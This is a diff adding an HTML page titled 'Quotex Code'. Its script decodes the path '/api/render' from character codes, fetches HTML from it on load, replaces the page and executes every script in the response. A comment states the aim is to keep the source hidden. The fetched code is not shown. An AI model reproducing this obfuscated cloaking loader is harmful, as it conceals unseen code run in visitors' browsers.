@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quotex Code</title>
+    <link rel="icon" type="image/png" href="https://i.postimg.cc/FsZx0RMQ/quotex-io-logo-png-seeklogo-431725.png">
+</head>
+<body style="margin:0;padding:0;background:linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);min-height:100vh;">
+<script>
+!function(){
+    /* Load content from API - keeps source code hidden */
+    var c=[47,97,112,105,47,114,101,110,100,101,114];
+    var u='';for(var i=0;i<c.length;i++)u+=String.fromCharCode(c[i]);
+    var url=u+'?_t='+Date.now()+'&_k='+Math.random().toString(36).substr(2);
+
+    fetch(url,{cache:'no-store'})
+    .then(function(r){return r.text()})
+    .then(function(html){
+        var p=new DOMParser();
+        var d=p.parseFromString(html,'text/html');
+
+        // Copy head elements
+        var hEls=d.head.querySelectorAll('link,style,meta');
+        for(var i=0;i<hEls.length;i++){
+            var el=hEls[i];
+            if(el.tagName==='META'&&(el.getAttribute('charset')||el.getAttribute('name')==='viewport'))continue;
+            document.head.appendChild(document.importNode(el,true));
+        }
+        if(d.title)document.title=d.title;
+
+        // Set body
+        document.body.removeAttribute('style');
+        document.body.innerHTML=d.body.innerHTML;
+        var attrs=d.body.attributes;
+        for(var j=0;j<attrs.length;j++) document.body.setAttribute(attrs[j].name,attrs[j].value);
+
+        // Execute scripts
+        var runScripts=function(container){
+            var scripts=container.querySelectorAll('script');
+            scripts.forEach(function(old){
+                var ns=document.createElement('script');
+                if(old.src)ns.src=old.src; else ns.textContent=old.textContent;
+                for(var k=0;k<old.attributes.length;k++){
+                    if(old.attributes[k].name!=='src')ns.setAttribute(old.attributes[k].name,old.attributes[k].value);
+                }
+                old.parentNode.replaceChild(ns,old);
+            });
+        };
+
+        // Head scripts
+        var hs=d.head.querySelectorAll('script');
+        hs.forEach(function(old){
+            var ns=document.createElement('script');
+            if(old.src)ns.src=old.src; else ns.textContent=old.textContent;
+            document.head.appendChild(ns);
+        });
+
+        // Body scripts
+        runScripts(document.body);
+    })
+    .catch(function(){
+        setTimeout(function(){location.reload()},2000);
+    });
+}();
+</script>
+</body>
+</html>
